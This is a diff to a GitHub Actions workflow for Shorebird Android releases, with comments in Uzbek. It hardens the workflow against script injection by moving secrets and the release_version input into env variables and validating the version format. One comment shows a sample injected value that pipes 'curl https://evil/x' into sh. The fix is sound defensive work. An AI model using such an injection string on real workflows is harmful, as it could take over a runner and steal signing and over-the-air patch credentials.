@@ -84,6 +84,20 @@ jobs:
         env:
           KEYSTORE_B64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}
           GOOGLE_SERVICES_B64: ${{ secrets.GOOGLE_SERVICES_JSON_BASE64 }}
+          # ┌─ TUZATILGAN NOSOZLIK (bug.md 94-band) ────────────────────┐
+          # Bu uchtasi AVVAL `run:` ichida `${{ secrets.* }}` sifatida
+          # turardi. GitHub Actions `${{ }}` ni shell ishga
+          # tushishidan OLDIN MATN sifatida o'rniga qo'yadi — ya'ni
+          # qiymatdagi shell belgisi yoki yangi qator fayl mazmunini
+          # buzardi (yoki yomonroq holatda buyruqqa aylanardi).
+          #
+          # `KEYSTORE_B64` va `GOOGLE_SERVICES_B64` shu qadamning
+          # O'ZIDA allaqachon to'g'ri usulda — `env:` orqali —
+          # berilgan edi. Endi uchalasi ham shu naqshga o'tdi.
+          # └───────────────────────────────────────────────────────────┘
+          KEYSTORE_PASSWORD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
+          KEY_ALIAS: ${{ secrets.ANDROID_KEY_ALIAS }}
+          KEY_PASSWORD: ${{ secrets.ANDROID_KEY_PASSWORD }}
         run: |
           set -euo pipefail
 
@@ -95,11 +109,14 @@ jobs:
           fi
 
           echo "${KEYSTORE_B64}" | base64 -d > android/upload-keystore.jks
+          # Qo'shtirnoqsiz `EOF` — o'zgaruvchi almashtirish SHELL
+          # tomonidan bajariladi (Actions tomonidan emas), ya'ni
+          # qiymatlar hech qachon buyruq bo'lib ketmaydi.
           cat > android/key.properties <<EOF
           storeFile=upload-keystore.jks
-          storePassword=${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
-          keyAlias=${{ secrets.ANDROID_KEY_ALIAS }}
-          keyPassword=${{ secrets.ANDROID_KEY_PASSWORD }}
+          storePassword=${KEYSTORE_PASSWORD}
+          keyAlias=${KEY_ALIAS}
+          keyPassword=${KEY_PASSWORD}
           EOF
 
           if [ -n "${GOOGLE_SERVICES_B64}" ]; then
@@ -169,35 +186,83 @@ jobs:
       # noto'g'ri relizga yamoq chiqarish xavfini yaratadi.
       - name: Reliz versiyasi ko'rsatilganini tekshirish
         if: inputs.action == 'patch'
+        env:
+          RELEASE_VERSION: ${{ inputs.release_version }}
         run: |
           # Teskari qo'shtirnoq ISHLATILMAYDI: bash uni buyruq
           # bajarish deb tushunadi va qadam boshqa sababdan yiqilardi.
-          if [ -z "${{ inputs.release_version }}" ]; then
+          if [ -z "${RELEASE_VERSION}" ]; then
             echo "::error::PATCH uchun release_version MAJBURIY (masalan 0.1.0+1)."
             echo "Mavjud relizlarni ko'rish: shorebird releases list"
             exit 1
           fi
+          # ┌─ FORMAT TEKSHIRUVI (bug.md 94-band) ─────────────────────┐
+          # `release_version` — `workflow_dispatch` ning ERKIN MATN
+          # kiritmasi. Faqat raqam, nuqta va `+` ga ruxsat beriladi
+          # (`0.1.0+1` shakli), boshqa har qanday belgi rad etiladi.
+          #
+          # Bu ikkinchi qatlam: asosiy himoya — qiymatni `run:` ichiga
+          # umuman qo'ymaslik (pastdagi qadamga qarang). Lekin bu yerda
+          # ham tekshiriladi, chunki noto'g'ri versiya baribir xato —
+          # va xatoni yamoq chiqarilgandan keyin emas, hozir ko'rish
+          # kerak.
+          # └──────────────────────────────────────────────────────────┘
+          case "${RELEASE_VERSION}" in
+            *[!0-9.+]*)
+              echo "::error::release_version formati noto'g'ri: faqat raqam, '.' va '+' (masalan 0.1.0+1)."
+              exit 1
+              ;;
+          esac
 
       - name: Shorebird patch
         if: inputs.action == 'patch'
         env:
           SHOREBIRD_TOKEN: ${{ secrets.SHOREBIRD_TOKEN }}
+          # ┌─ NEGA `env:` (bug.md 94-band) ───────────────────────────┐
+          # Avval bu yerda `--release-version=${{ inputs.release_version }}`
+          # QO'SHTIRNOQSIZ turardi. Actions `${{ }}` ni shell ishga
+          # tushishidan oldin matn sifatida qo'yadi, ya'ni
+          #
+          #	0.1.0+1; curl -s https://evil/x | sh
+          #
+          # runner'da ixtiyoriy buyruq bajarardi. O'sha runner o'sha
+          # paytda `SHOREBIRD_TOKEN` (do'kon ko'rigisiz OTA kod
+          # yamog'i huquqi), Play Store imzolash kaliti va
+          # `google-services.json` ni ushlab turadi.
+          #
+          # `shorebird.yaml` da `auto_update` izohga olingan, ya'ni
+          # standart `true` amal qiladi: yamoq foydalanuvchidan
+          # rozilik so'ramasdan, keyingi ochilishda o'zi qo'llanadi.
+          # Shu sababli bu kalitning yo'qolishi butun foydalanuvchi
+          # bazasiga teng narxga ega.
+          #
+          # GitHub'ning o'z tavsiyasi: `${{ }}` hech qachon `run:`
+          # ichida bo'lmasin.
+          # └──────────────────────────────────────────────────────────┘
+          RELEASE_VERSION: ${{ inputs.release_version }}
         run: |
           shorebird patch android \
-            --release-version=${{ inputs.release_version }} \
+            --release-version="${RELEASE_VERSION}" \
             --no-confirm \
             -- --dart-define-from-file=config/prod.json
 
       - name: Xulosa
         if: always()
+        env:
+          # Xulosa matni ham `run:` ichida `${{ }}` ishlatmaydi —
+          # 94-banddagi bir xil qoida. `action` ro'yxatdan tanlanadi,
+          # lekin qoida istisnosiz qo'llanadi: istisno bo'lgan joyda
+          # keyingi tahrir uni yana ochib yuborishi mumkin.
+          ACTION: ${{ inputs.action }}
+          RELEASE_VERSION: ${{ inputs.release_version }}
         run: |
           {
-            echo "### Shorebird — ${{ inputs.action }}"
-            if [ "${{ inputs.action }}" = "release" ]; then
+            echo "### Shorebird — ${ACTION}"
+            if [ "${ACTION}" = "release" ]; then
               echo "AAB artefakt sifatida saqlandi. Play Console'ga QO'LDA yuklanadi."
               echo "Yuklangach yamoq chiqarish uchun shu versiyani ishlating."
             else
-              echo "Yamoq \`${{ inputs.release_version }}\` relizga chiqarildi."
+              echo "Yamoq \`${RELEASE_VERSION}\` relizga chiqarildi."
               echo "Foydalanuvchilar ilovani KEYINGI ochganda oladi."
             fi
           } >> "$GITHUB_STEP_SUMMARY"
